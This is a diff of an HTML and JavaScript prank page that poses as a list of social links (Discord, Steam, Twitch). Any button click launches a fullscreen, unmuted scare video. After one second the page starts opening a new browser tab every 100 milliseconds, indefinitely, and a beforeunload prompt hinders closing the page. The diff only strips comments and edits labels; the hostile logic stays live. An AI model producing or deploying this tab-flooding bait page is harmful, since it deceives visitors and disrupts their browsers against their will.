@@ -7,45 +7,43 @@
 <style type="text/css">
     body {
         margin: 0;
-        overflow: hidden; /* Предотвращаем скролл, если контент выйдет за пределы */
+        overflow: hidden; 
         font-family: sans-serif;
     }
     *, *::before, *::after {
         box-sizing: border-box;
     }
 
-    /* Стили для контейнера с кнопками "кликбейт" */
     #clickbait-container {
         position: fixed;
         top: 0;
         left: 0;
         height: 100vh;
         width: 100vw;
-        background-color: black; /* Черный фон, чтобы ничего не было видно до клика */
-        display: flex; /* Используем flexbox для центрирования кнопок */
+        background-color: black; 
+        display: flex; 
         justify-content: center;
         align-items: center;
-        z-index: 100; /* Убедимся, что контейнер с кнопками поверх всего */
-        color: white; /* Цвет текста */
-        flex-direction: column; /* Кнопки будут располагаться друг под другом */
-        gap: 20px; /* Отступ между элементами */
+        z-index: 100; 
+        color: white; 
+        flex-direction: column; 
+        gap: 20px; 
         text-align: center;
         padding: 20px;
     }
 
-    /* Стили для всех кнопок-триггеров */
-    .start-button-trigger { /* Обновленный селектор для кнопок */
-        padding: 15px 30px; /* Немного уменьшил padding, чтобы кнопки могли уместиться */
-        font-size: 1.5em; /* Немного уменьшил размер шрифта */
+    .start-button-trigger { 
+        padding: 15px 30px; 
+        font-size: 1.5em; 
         cursor: pointer;
-        background-color: #ff0000; /* Красная кнопка, привлекающая внимание */
+        background-color: #ff0000; 
         color: white;
         border: none;
         border-radius: 10px;
         box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
         transition: background-color 0.3s ease, transform 0.1s ease;
-        min-width: 250px; /* Чтобы все кнопки были одинаковой ширины */
-        text-transform: uppercase; /* Добавим, чтобы выглядело более "кликбейтно" */
+        min-width: 250px; 
+        text-transform: uppercase; 
         font-weight: bold;
     }
 
@@ -59,7 +57,6 @@
         box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
     }
 
-    /* Изначально скрываем видео-контейнер */
     #scare-video-container {
         position: fixed;
         top: 0;
@@ -82,18 +79,16 @@
 </head>
 <body>
 
-<!-- Контейнер с "кликбейт" кнопками, который виден в начале -->
 <div id="clickbait-container">
     <h1>50CiAl l1Nk5</h1>
     <p>it says social links here if you're dumb and don't understand</p>
     <button class="start-button-trigger">Discord</button>
-    <button class="start-button-trigger">X</button>
-    <button class="start-button-trigger">Steam Snow</button>
-    <button class="start-button-trigger">Steam everything</button>
+    <button class="start-button-trigger">button lol</button>
+    <button class="start-button-trigger">Steam_Snow</button>
+    <button class="start-button-trigger">Steam_everything</button>
     <button class="start-button-trigger">Twitch</button>
 </div>
 
-<!-- Основной "пугающий" контент (видео), который изначально скрыт -->
 <div id="scare-video-container">
     <video id="video" src="media/video.mp4" loop playsinline></video>
 </div>
@@ -101,30 +96,25 @@
 <script type="text/javascript">
     const video = document.getElementById("video");
     const targetUrl = "https://penis-git-main-fe1zyyys-projects.vercel.app/";
-    // Теперь получаем все кнопки с классом 'start-button-trigger'
     const startButtons = document.querySelectorAll(".start-button-trigger"); 
     const clickbaitContainer = document.getElementById("clickbait-container");
     const scareVideoContainer = document.getElementById("scare-video-container");
 
-    // Отладочные логи: Проверяем, найдены ли элементы
     console.log("Элементы:");
     console.log("video:", video);
     console.log("startButtons (NodeList):", startButtons);
     console.log("clickbaitContainer:", clickbaitContainer);
     console.log("scareVideoContainer:", scareVideoContainer);
 
-    // Предупреждение при закрытии страницы
     window.addEventListener('beforeunload', function(e) {
         e.preventDefault();
-        e.returnValue = 'Ваши данные могут не сохраниться, точно закрыть?';
-        return 'Ваши данные могут не сохраниться, точно закрыть?';
+        e.returnValue = 'real?';
+        return 'real?';
     });
 
-    // Функция для запроса полноэкранного режима и разглушения видео
     function requestFullscreenAndUnmute() {
         console.log("Attempting to request fullscreen and unmute.");
         
-        // Если видео заглушено, разглушаем его при пользовательском клике
         if (video && video.muted) { 
             video.muted = false;
             console.log("Video unmuted by user interaction.");
@@ -133,35 +123,29 @@
         const { documentElement } = document;
         if(documentElement.requestFullscreen) {
             documentElement.requestFullscreen();
-        } else if(documentElement.mozRequestFullScreen) { // Firefox
+        } else if(documentElement.mozRequestFullScreen) { 
             documentElement.mozRequestFullScreen();
-        } else if(documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+        } else if(documentElement.webkitRequestFullscreen) { 
             documentElement.webkitRequestFullscreen();
-        } else if(documentElement.msRequestFullscreen) { // IE/Edge
+        } else if(documentElement.msRequestFullscreen) { 
             documentElement.msRequestFullscreen();
         }
     }
 
-    // Функция для открытия новой вкладки
     function openNewTab() {
         console.log("Attempting to open new tab:", targetUrl);
         window.open(targetUrl, '_blank');
     }
 
-    // Функция, которая запускает всю "пугающую" последовательность
     function startScareSequence() {
         console.log("startScareSequence() called.");
 
-        // Скрываем контейнер с кнопками
         if (clickbaitContainer) clickbaitContainer.style.display = 'none';
-        // Показываем контейнер с видео
         if (scareVideoContainer) scareVideoContainer.style.display = 'block';
         console.log("Containers visibility toggled.");
 
-        // === ВАЖНО: Принудительно заглушаем видео для автоплея ===
         if (video) video.muted = true; 
         
-        // Запускаем видео
         if (video) { 
             video.play()
                 .then(() => {
@@ -170,20 +154,18 @@ requestFullscreenAndUnmute();
                 })
                 .catch(error => {
                     console.error("Autoplay failed:", error);
-                    alert("Не удалось запустить видео автоматически. Пожалуйста, кликните по экрану.");
+                    alert("failed.");
                 });
         } else {
             console.error("Video element not found, cannot play.");
         }
         
-        // Начинаем открывать вкладки через секунду после запуска видео
         setTimeout(() => {
             console.log("Starting to open new tabs after 1 second...");
             setInterval(openNewTab, 100);
         }, 1000);
     }
 
-    // Добавляем обработчик события для каждой "кликбейт" кнопки
     if (startButtons.length > 0) {
         startButtons.forEach(button => {
             button.addEventListener('click', startScareSequence);
@@ -193,8 +175,6 @@ requestFullscreenAndUnmute();
         console.error("No start buttons found with class '.start-button-trigger'!");
     }
 
-    // Добавляем обработчик события для видео: при клике на него
-    // будет попытка войти в полноэкранный режим и разглушить видео.
     if (video) {
         video.addEventListener("click", requestFullscreenAndUnmute);
         console.log("Event listener added to video for fullscreen and unmute.");
